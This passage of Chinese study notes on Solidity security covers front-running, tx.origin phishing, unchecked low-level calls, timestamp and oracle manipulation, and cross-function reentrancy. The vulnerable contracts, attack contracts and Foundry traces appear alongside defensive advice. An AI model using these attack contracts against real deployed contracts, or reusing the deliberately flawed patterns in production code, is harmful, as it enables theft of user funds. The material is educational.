<p><strong>3. 部署NFT合约：</strong> 在 Remix 上部署一个简单的 freemint（免费铸造）NFT合约。它有一个<code>mint()</code>，用于免费铸造NFT。</p>
<p><strong>4. 部署ethers.js抢跑脚本：</strong> 简单来说，<code>frontrun.js</code>脚本监听了测试链<code>mempool</code>中的未决交易，筛选出调用了<code>mint()</code>的交易，然后复制它并调高<code>gas</code>进行抢跑。</p>
<p><strong>5. 调用<code>mint()</code>函数：</strong> 在 Remix 的部署页面调用 Freemint 合约的<code>mint()</code> 函数，进行 NFT 铸造。</p>
<p><strong>6. 脚本监听到交易并进行抢跑</strong> 我们可以在终端看到 <code>frontrun.js</code> 脚本成功监听到了交易，并进行了抢跑。如果你调用 NFT 合约的 <code>ownerOf()</code> 函数查看 <code>tokenId</code> 为 0 的持有者是抢跑脚本中的钱包地址，证明抢跑成功！。</p>
<h2 id="预防方法-1"><a href="#预防方法-1" class="headerlink" title="预防方法"></a>预防方法</h2><p>抢先交易是以太坊等公链上普遍存在的问题。我们没法消除它，但是可以通过减少交易顺序或时间的重要性，减少被抢先交易的收益：</p>
<ul>
<li>使用预提交方案(commit-reveal scheme)。</li>
<li>使用暗池，用户发出的交易将不进入公开的<code>mempool</code>，而是直接到矿工手里。例如 flashbots 和 TaiChi。</li>
<li>在调用参数中加上保护性参数，如<a target="_blank" rel="noopener" href="https://uniswapv3book.com/milestone_3/slippage-protection.html">滑点保护</a>，从而减少抢跑者的潜在收益。</li>
</ul>
<p>具体操作步骤可以看<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/S11_Frontrun">WTF Solidity 合约安全: S11. 抢先交易</a></p>
<h1 id="S12-tx-origin钓鱼攻击"><a href="#S12-tx-origin钓鱼攻击" class="headerlink" title="S12. tx.origin钓鱼攻击"></a>S12. tx.origin钓鱼攻击</h1><p>上初中的时候特别喜欢玩游戏，但是项目方为了防止未成年人沉迷，规定只有身份证号显示已满十八岁的玩家才不受防沉迷限制。这该怎么办呢？后来自己饿使用家长的身份证号进行年龄验证，并成功绕过了防沉迷系统。这个案例与<code>tx.origin</code>钓鱼攻击有着异曲同工之妙。</p>
<p>在<code>solidity</code>中，使用<code>tx.origin</code>可以获得启动交易的原始地址，它与<code>msg.sender</code>十分相似，下面我们用一个例子来区分它们之间不同的地方。</p>
<p>如果用户A调用了B合约，再通过B合约调用了C合约，那么在C合约看来，<code>msg.sender</code>就是B合约，而<code>tx.origin</code>就是用户A。如果你不了解<code>call</code>的机制，可以阅读<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/22_Call/readme.md">WTF Solidity极简教程第22讲：Call</a>。</p>
<p><img src="/img/web3/S12_1.jpg" srcset="/img/loading.gif" lazyload alt="S12-1"></p>
<p>因此如果一个银行合约使用了<code>tx.origin</code>做身份认证，那么黑客就有可能先部署一个攻击合约，然后再诱导银行合约的拥有者调用，即使<code>msg.sender</code>是攻击合约地址，但<code>tx.origin</code>是银行合约拥有者地址，那么转账就有可能成功。</p>
<h2 id="漏洞合约例子-5"><a href="#漏洞合约例子-5" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><h3 id="银行合约-1"><a href="#银行合约-1" class="headerlink" title="银行合约"></a>银行合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Bank &#123;<br>    address public owner;//记录合约的拥有者<br><br>    //在创建合约时给 owner 变量赋值<br>    constructor() payable &#123;<br>        owner = msg.sender;<br>    &#125;<br><br>    function transfer(address payable _to, uint _amount) public &#123;<br>        //检查消息来源 ！！！ 可能owner会被诱导调用该函数，有钓鱼风险！<br>        require(tx.origin == owner, &quot;Not owner&quot;);<br>        //转账ETH<br>        (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;);<br>        require(sent, &quot;Failed to send Ether&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="攻击合约-1"><a href="#攻击合约-1" class="headerlink" title="攻击合约"></a>攻击合约</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    // 受益者地址<br>    address payable public hacker;<br>    // Bank合约地址<br>    Bank bank;<br><br>    constructor(Bank _bank) &#123;<br>        //强制将address类型的_bank转换为Bank类型<br>        bank = Bank(_bank);<br>        //将受益者地址赋值为部署者地址<br>        hacker = payable(msg.sender);<br>    &#125;<br><br>    function attack() public &#123;<br>        //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中<br>        bank.transfer(hacker, address(bank).balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="攻击复线"><a href="#攻击复线" class="headerlink" title="攻击复线"></a>攻击复线</h3><p><strong>1.</strong> 先将<code>value</code>设置为10ETH，再部署 <code>Bank</code> 合约，拥有者地址 <code>owner</code> 被初始化为部署合约地址。</p>
<p><strong>2.</strong> 切换到另一个钱包作为黑客钱包，填入要攻击的银行合约地址，再部署 <code>Attack</code> 合约，黑客地址 <code>hacker</code> 被初始化为部署合约地址</p>
<p><strong>3.</strong> 切换回<code>owner</code>地址，此时我们被诱导调用了<code>Attack</code>合约的<code>attack()</code>函数，可以看到<code>Bank</code>合约余额被掏空了，同时黑客地址多了10ETH</p>
<h2 id="预防办法-4"><a href="#预防办法-4" class="headerlink" title="预防办法"></a>预防办法</h2><h3 id="1-使用msg-sender代替tx-origin"><a href="#1-使用msg-sender代替tx-origin" class="headerlink" title="1.使用msg.sender代替tx.origin"></a>1.使用<code>msg.sender</code>代替<code>tx.origin</code></h3><p><code>msg.sender</code>能够获取直接调用当前合约的调用发送者地址，通过对<code>msg.sender</code>的检验，就可以避免整个调用过程中混入外部攻击合约对当前合约的调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address payable _to, uint256 _amount) public &#123;<br>  require(msg.sender == owner, &quot;Not owner&quot;);<br><br>  (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;);<br>  require(sent, &quot;Failed to send Ether&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="2-检验tx-origin-msg-sender"><a href="#2-检验tx-origin-msg-sender" class="headerlink" title="2.检验tx.origin == msg.sender"></a>2.检验<code>tx.origin == msg.sender</code></h3><p>如果一定要使用<code>tx.origin</code>，那么可以再检验<code>tx.origin</code>是否等于<code>msg.sender</code>，这样也可以避免整个调用过程中混入外部攻击合约对当前合约的调用。但是副作用是其他合约将不能调用这个函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transfer(address payable _to, uint _amount) public &#123;<br>    require(tx.origin == owner, &quot;Not owner&quot;);<br>    require(tx.origin == msg.sender, &quot;can&#x27;t call by external contract&quot;);<br>    (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;);<br>    require(sent, &quot;Failed to send Ether&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="S13-未检查的低级调用"><a href="#S13-未检查的低级调用" class="headerlink" title="S13. 未检查的低级调用"></a>S13. 未检查的低级调用</h1><p>失败的低级调用不会让交易回滚，如果合约中忘记对其返回值进行检查，往往会出现严重的问题。</p>
<p>以太坊的低级调用包括 <code>call()</code>，<code>delegatecall()</code>，<code>staticcall()</code>，和<code>send()</code>。这些函数与 Solidity 其他函数不同，当出现异常时，它并不会向上层传递，也不会导致交易完全回滚；它只会返回一个布尔值 <code>false</code> ，传递调用失败的信息。因此，如果未检查低级函数调用的返回值，则无论低级调用失败与否，上层函数的代码会继续运行。对于低级调用更多的内容，请阅读 <a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity">WTF Solidity 极简教程第20-23讲</a>。</p>
<p>最容易出错的是<code>send()</code>：一些合约使用 <code>send()</code> 发送 <code>ETH</code>，但是 <code>send()</code> 限制 gas 要低于 2300，否则会失败。当目标地址的回调函数比较复杂时，花费的 gas 将高于 2300，从而导致 <code>send()</code> 失败。如果此时在上层函数没有检查返回值的话，交易继续执行，就会出现意想不到的问题。2016年，有一款叫 <code>King of Ether</code> 的链游，因为这个漏洞导致退款无法正常发送（<a target="_blank" rel="noopener" href="https://www.kingoftheether.com/postmortem.html">验尸报告</a>）。</p>
<p><img src="/img/web3/S13-1.png" srcset="/img/loading.gif" lazyload alt="S13-1"></p>
<h2 id="漏洞例子-2"><a href="#漏洞例子-2" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><h3 id="银行合约-2"><a href="#银行合约-2" class="headerlink" title="银行合约"></a>银行合约</h3><p>这个合约是在<code>S01 重入攻击</code>教程中的银行合约基础上修改而成。它包含<code>1</code>个状态变量<code>balanceOf</code>记录所有用户的以太坊余额；并且包含<code>3</code>个函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UncheckedBank &#123;<br>    mapping (address =&gt; uint256) public balanceOf;    // 余额mapping<br><br>    // 存入ether，并更新余额<br>    function deposit() external payable &#123;<br>        balanceOf[msg.sender] += msg.value;<br>    &#125;<br><br>    // 提取msg.sender的全部ether<br>    function withdraw() external &#123;<br>        // 获取余额<br>        uint256 balance = balanceOf[msg.sender];<br>        require(balance &gt; 0, &quot;Insufficient balance&quot;);<br>        balanceOf[msg.sender] = 0;<br>        // Unchecked low-level call<br>        bool success = payable(msg.sender).send(balance);<br>    &#125;<br><br>    // 获取银行合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="攻击合约-2"><a href="#攻击合约-2" class="headerlink" title="攻击合约"></a>攻击合约</h2><p>我们构造了一个攻击合约，它刻画了一个倒霉的储户，取款失败但是银行余额清零：合约回调函数 <code>receive()</code> 中的 <code>revert()</code> 将回滚交易，因此它无法接收 <code>ETH</code>；但是提款函数 <code>withdraw()</code> 却能正常调用，清空余额</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UncheckedAttack &#123;<br>    UncheckedBank public bank; // Bank合约地址<br>    // 初始化Bank合约地址<br>    constructor(UncheckedBank _bank) &#123;<br>        bank = _bank;<br>    &#125;<br>    // 回调函数，转账ETH时会失败<br>    receive() external payable &#123;<br>        revert();<br>    &#125;<br>    // 存款函数，调用时 msg.value 设为存款数量<br>    function deposit() external payable &#123;<br>        bank.deposit&#123;value: msg.value&#125;();<br>    &#125;<br>    // 取款函数，虽然调用成功，但实际上取款失败<br>    function withdraw() external payable &#123;<br>        bank.withdraw();<br>    &#125;<br>    // 获取本合约的余额<br>    function getBalance() external view returns (uint256) &#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UncheckedAttackTest is Test &#123;<br>    UncheckedBank public bank;<br>    UncheckedAttack public attack;<br>    function setUp() public &#123;<br>        bank = new UncheckedBank(); // 部署Bank合约<br>        vm.deal(address(this), 1000 * 1e18);<br>//        bank.deposit&#123;value: 3 * 1e18&#125;();// 往 bank充值3颗ETH<br>        attack = new UncheckedAttack(bank); // 部署攻击合约<br>    &#125;<br>    function test_attack() public &#123;<br>        // 攻击执行<br>        attack.deposit&#123;value: 1 * 1e18&#125;();<br>        uint256 balancesAfter = attack.getBalance(); // 但是我仍然没有收到这个余额，提款失败了<br>        console.log(&quot;balances After  is &quot;, balancesAfter);<br>        bank.balanceOf(address(attack)); // 有1 ETH<br><br>        attack.withdraw();//提款，提款失败了，但是我的余额也没有了<br><br>        bank.balanceOf(address(attack)); //没了<br>        uint256 balancesBefore = attack.getBalance(); // 但是我仍然没有收到这个余额，提款失败了<br>        console.log(&quot;balances Before   is &quot;, balancesBefore);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>执行结果</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">Traces:<br>  [66787] UncheckedAttackTest::test_attack()<br>    ├─ [34398] UncheckedAttack::deposit&#123;value: 1000000000000000000&#125;()<br>    │   ├─ [22559] UncheckedBank::deposit&#123;value: 1000000000000000000&#125;()<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [312] UncheckedAttack::getBalance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;balances After  is &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [823] UncheckedBank::balanceOf(UncheckedAttack: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall]<br>    │   └─ ← [Return] 1000000000000000000 [1e18]<br>    ├─ [8083] UncheckedAttack::withdraw()<br>    │   ├─ [7493] UncheckedBank::withdraw()<br>    │   │   ├─ [45] UncheckedAttack::receive&#123;value: 1000000000000000000&#125;()<br>    │   │   │   └─ ← [Revert] EvmError: Revert<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [823] UncheckedBank::balanceOf(UncheckedAttack: [0x2e234DAe75C793f67A35089C9d99245E1C58470b]) [staticcall] //余额没了<br>    │   └─ ← [Return] 0<br>    ├─ [312] UncheckedAttack::getBalance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;balances Before   is &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>

<h2 id="预防办法-5"><a href="#预防办法-5" class="headerlink" title="预防办法"></a>预防办法</h2><p>你可以使用以下几种方法来预防未检查低级调用的漏洞：</p>
<ol>
<li><p>检查低级调用的返回值，在上面的银行合约中，我们可以改正 <code>withdraw()</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">bool success = payable(msg.sender).send(balance);<br>require(success, &quot;Failed Sending ETH!&quot;)<br></code></pre></td></tr></table></figure>


</li>
<li><p>合约转账<code>ETH</code>时，使用 <code>call()</code>，并做好重入保护。</p>
</li>
<li><p>使用<code>OpenZeppelin</code>的<a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol">Address库</a>，它将检查返回值的低级调用封装好了。</p>
</li>
</ol>
<h1 id="S14-操纵区块时间"><a href="#S14-操纵区块时间" class="headerlink" title="S14. 操纵区块时间"></a>S14. 操纵区块时间</h1><p>以太坊矿工可以操纵区块时间，如果抽奖合约的伪随机数依赖于区块时间，则可能被攻击。</p>
<h2 id="区块时间"><a href="#区块时间" class="headerlink" title="区块时间"></a>区块时间</h2><p>区块时间（block timestamp）是包含在以太坊区块头中的一个 <code>uint64</code> 值，代表此区块创建的 UTC 时间戳（单位：秒），在合并（The Merge）之前，以太坊会根据算力调整区块难度，因此出块时间不定，平均 14.5s 出一个区块，矿工可以操纵区块时间；合并之后，改为固定 12s 一个区块，验证节点不能操纵区块时间。</p>
<p>在 Solidity 中，开发者可以通过全局变量 <code>block.timestamp</code> 获取当前区块的时间戳，类型为 <code>uint256</code>。</p>
<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了智能合约的操纵区块时间攻击，并使用 Foundry 复现了它。在合并（The Merge）之前，以太坊矿工可以操纵区块时间，如果抽奖合约的伪随机数依赖于区块时间，则可能被攻击。合并之后，以太坊改为固定 12s 一个区块，并且验证节点不能操纵区块时间。因此这类攻击不会在以太坊上发生，但仍可能在其他公链中遇到。</p>
<h1 id="S15-操纵预言机"><a href="#S15-操纵预言机" class="headerlink" title="S15. 操纵预言机"></a>S15. 操纵预言机</h1><h2 id="价格预言机"><a href="#价格预言机" class="headerlink" title="价格预言机"></a>价格预言机</h2><p>出于安全性的考虑，以太坊虚拟机（EVM）是一个封闭孤立的沙盒。在EVM上运行的智能合约可以接触链上信息，但无法主动和外界沟通获取链下信息。但是，这类信息对去中心化应用非常重要。</p>
<p>预言机（oracle）可以帮助我们解决这个问题，它从链下数据源获得信息，并将其添加到链上，供智能合约使用。</p>
<p>其中最常用的就是价格预言机（price oracle），它可以指代任何可以让你查询币价的数据源。典型用例：</p>
<ul>
<li>去中心借贷平台（AAVE）使用它来确定借款人是否已达到清算阈值。</li>
<li>合成资产平台（Synthetix）使用它来确定资产最新价格，并支持 0 滑点交易。</li>
<li>MakerDAO使用它来确定抵押品的价格，并铸造相应的稳定币 $DAI。</li>
</ul>
<p><strong>在很多场景下，都需要知道代币的当前价格，比如说你给我1颗BTC我给你当前BTC同等价值的USDT，这个价格怎么来呢？只能从价格预言机里来，如果找到了这个合约所依赖的价格预言机来源（比如说某个池Uniswapv2的池子的当前储备量：USDT&lt;&#x3D;&#x3D;&gt;wBTC），且操控了预言机，是不是就可以以更少的BTC换到更多的USDT了？</strong></p>
<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>我们针对有漏洞的价格预言机 <code>getPrice()</code> 函数进行攻击，步骤：</p>
<ol>
<li>准备一些 <code>BUSD</code>，可以是自有资金，也可以是闪电贷借款。在实现中，我们利用 Foundry 的 <code>deal</code> cheatcode 在本地网络上给自己铸造了 <code>1_000_000 BUSD</code></li>
<li>在 UniswapV2 的 <code>WETH-BUSD</code> 池中使用<code>BUSD</code>大量买入 <code>WETH</code>。具体实现见攻击代码的 <code>swapBUSDtoWETH()</code> 函数。</li>
<li>在此情况下，<code>WETH-BUSD</code>池中代币对比例失去了平衡，<code>WETH</code> 瞬时价格暴涨，这时我们调用 <code>swap()</code> 函数将 <code>ETH</code> 转换为 <code>oUSD</code>。</li>
<li><strong>可选:</strong> 在 UniswapV2 的 <code>WETH-BUSD</code> 池中卖出第2步买入的 <code>WETH</code>，收回本金。</li>
</ol>
<h2 id="预防方法-2"><a href="#预防方法-2" class="headerlink" title="预防方法"></a>预防方法</h2><p>知名区块链安全专家 <code>samczsun</code> 在一篇<a target="_blank" rel="noopener" href="https://www.paradigm.xyz/2020/11/so-you-want-to-use-a-price-oracle">博客</a>中总结了预言机操纵的预防方法，这里总结一下：</p>
<ol>
<li>不要使用流动性差的池子做价格预言机。</li>
<li>不要使用现货&#x2F;瞬时价格做价格预言机，要加入价格延迟，例如时间加权平均价格（TWAP）。</li>
<li>使用去中心化的预言机。</li>
<li>使用多个数据源，每次选取最接近价格中位数的几个作为预言机，避免极端情况。</li>
<li>在使用Oracle预言机的询价方法如<code>latestRoundData()</code>，需要对返回结果进行校验，防止使用过时失效数据。</li>
<li>仔细阅读第三方价格预言机的使用文档及参数设置。</li>
</ol>
<h1 id="S16-NFT重入攻击"><a href="#S16-NFT重入攻击" class="headerlink" title="S16. NFT重入攻击"></a>S16. NFT重入攻击</h1><p>——-空一下</p>
<h1 id="S17-“跨服”重入攻击"><a href="#S17-“跨服”重入攻击" class="headerlink" title="S17. “跨服”重入攻击"></a>S17. “跨服”重入攻击</h1><p>在智能合约安全领域，重入攻击永远是一个备受关注的话题。在<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/blob/main/S01_ReentrancyAttack/readme.md">重入攻击</a>这一讲中，<code>0xAA</code>生动展示了教科书级经典的重入攻击思路；而在生产环境中，常常有一些更加安排巧妙，复杂的实例一直在以各种新瓶装旧酒的面目不断地出现，并且成功地对很多项目造成了破坏。这些实例展示了攻击者如何利用智能合约中的漏洞来搭配组合出精心策划的攻击。</p>
<p>我们将介绍一些生产环境中真实发生的具有“跨服”属性的重入攻击案例。所谓“跨服”，是对这一类型的攻击目标的生动概括，因为它们共同的手段是从某一个函数开始入手，但是攻击对象却是其他函数&#x2F;合约&#x2F;项目等等。在本讲中我会带领大家简化并提炼其操作，探讨攻击者的思路、利用的漏洞以及对应的防御措施。通过了解这些实例，我们可以更好地理解重入攻击的本质，并且提高我们编写安全智能合约的技能和意识。</p>
<p>注：以下所展示的代码示例均为简化过的<code>pseudo-code</code>, 主要以阐释攻击思路为目的。内容源自众多<code>Web3 Security Researchers</code>所分享的审计案例,感谢他们的贡献！</p>
<h2 id="1-跨函数重入攻击"><a href="#1-跨函数重入攻击" class="headerlink" title="1. 跨函数重入攻击"></a>1. 跨函数重入攻击</h2><p><em>“那一年，我戴了重入锁，不知对手为何物。直到那天，那个男人从天而降，还是卷走了我的银钱…” – 戴锁婆婆</em></p>
<p>请看如下代码示例：</p>
<p>银行合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity 0.8.17;<br><br>contract VulnerableBank &#123;<br>  mapping(address =&gt; uint256) public balances;<br><br>  uint256 private _status; // 重入锁<br><br>  // 重入锁<br>  modifier nonReentrant() &#123;<br>      // 在第一次调用 nonReentrant 时，_status 将是 0<br>       require(_status == 0, &quot;ReentrancyGuard: reentrant call&quot;);<br>      // 在此之后对 nonReentrant 的任何调用都将失败<br>      _status = 1;<br>      _;<br>      // 调用结束，将 _status 恢复为0<br>      _status = 0;<br>  &#125;<br><br>  function deposit() external payable &#123;<br>    require(msg.value &gt; 0, &quot;Deposit amount must ba greater than 0&quot;);<br>    balances[msg.sender] += msg.value;<br>  &#125;<br><br>  function withdraw(uint256 _amount) external nonReentrant &#123;<br>    uint256 balance = balances[msg.sender];<br>    require(balance &gt;= _amount, &quot;Insufficient balance&quot;);<br><br>    (bool success, ) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);//这里是转移eth必须重入锁<br>    // 这里就很巧妙，因为转账的时候会回去调用revice合约调完之后才会去下面更新 balances[msg.sender]<br>    require(success, &quot;Withdraw failed&quot;);<br><br>    balances[msg.sender] = balance - _amount;<br>  &#125;<br><br>  function transfer(address _to, uint256 _amount) external &#123;<br>    uint256 balance = balances[msg.sender];<br>    require(balance &gt;= _amount, &quot;Insufficient balance&quot;);<br><br>    balances[msg.sender] -= _amount;// 这里只是map修改，很多人以为没事的<br>    balances[_to] += _amount;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在上面的<code>VulnerableBank</code>合约中，可以看到转账<code>ETH</code>的步骤仅存在于<code>withdraw</code>这一个函数之内，而此函数已经使用了重入锁<code>nonReentrant</code>。那么，还有什么方法来对这个合约进行重入攻击呢？</p>
<p>请看如下攻击者合约示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity 0.8.17;<br><br>import &quot;../IVault.sol&quot;;<br><br>contract Attack2Contract &#123;<br>    address victim;<br>    address owner;<br><br>    constructor(address _victim, address _owner) &#123;<br>        victim = _victim;<br>        owner = _owner;<br>    &#125;<br><br>    function deposit() external payable &#123;<br>        IVault(victim).deposit&#123;value: msg.value&#125;(&quot;&quot;);<br>    &#125;<br><br>    function withdraw() external &#123;<br>        Ivault(victim).withdraw();//调用withdraw合约<br>    &#125;<br>		// 回调到receive合约<br>    receive() external payable &#123;<br>        uint256 balance = Ivault(victim).balances[address(this)];<br>        // 给我转账<br>        Ivault(victim).transfer(owner, balance);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>如上所示，攻击者重入的不再是<code>withdraw</code>函数，而是转头去重入没有戴锁的<code>transfer</code>函数。<code>VulnerableBank</code>合约的设计者的固有思路认为<code>transfer</code>函数中只是更改 <code>balances mapping</code>而没有转账<code>ETH</code>的步骤，所以应该不是重入攻击的对象，所以没有给它加上锁。而攻击者利用<code>withdraw</code>先将<code>ETH</code>转账，转账完成的时候<code>balances</code>没有立即更新，而随机调用了<code>transfer</code>函数将自己原本已不存在的余额成功转移给了另一个地址<code>owner</code>，而此地址完全可以是攻击者的一个小号而已。由于<code>transfer</code>函数没有转账<code>ETH</code>所以不会持续将执行权交出，所以这个重入只是攻击了额外一次便结束。结果是攻击者“无中生有”出了这一部分钱，实现了“双花”的功效。</p>
<p>可以这么理解：</p>
<blockquote>
<p> 0x哥在里面存了100块，然后调用提取的方法提100块，银行先给0x哥转账100块，转账会走到攻击合约的receive方法里面，在这个方法里回调银行合约的转账方法，转账方法改变balancesmap里面0x哥的余额成0，然后回去withdraw方法继续去调用balacnesmap里0x哥的余额，发现已经没有了，但是钱已经转给0x哥了，内部的balances余额却给另一个人记账了，实现了双花——-秒，秒啊</p>
</blockquote>
<p>那么问题来了：</p>
<p><em>如果改进一下， 将合约中的所有跟资产转移沾边的函数都加上重入锁，那是不是就安全了呢？？？</em></p>
<p>请看下面的进阶案例…</p>
